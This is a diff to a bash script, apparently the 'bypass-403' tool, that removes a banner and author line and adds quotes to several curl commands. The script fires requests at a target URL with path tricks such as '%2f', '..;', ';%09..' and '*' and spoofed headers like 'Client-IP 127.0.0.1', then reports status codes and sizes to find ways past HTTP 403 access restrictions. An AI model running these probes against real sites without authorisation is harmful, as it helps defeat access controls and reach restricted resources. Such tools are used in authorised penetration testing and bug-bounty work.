@@ -1,6 +1,4 @@
 #! /bin/bash
-figlet Bypass-403
-echo "                                               By Iam_J0ker"
 echo "./bypass-403.sh https://example.com path"
 echo " "
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
@@ -65,17 +63,17 @@ curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2f
 echo "  --> ${1}/%2f"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
 echo "  --> ${1}/."
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/..;
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/..;"
 echo "  --> ${1}/..;"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;09
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;09"
 echo "  --> ${1}/;09"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;09..
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;09.."
 echo "  --> ${1}/;09.."
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;%09..;
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;%09..;"
 echo "  --> ${1}/;09..;"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;%2f..
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;%2f.."
 echo "  --> ${1}/;%2f.."
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/*"
 echo "  --> ${1}/*"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP 127.0.0.1" $1/$2
 echo "  --> ${1}/${2} -H Client-IP: 127.0.0.1"
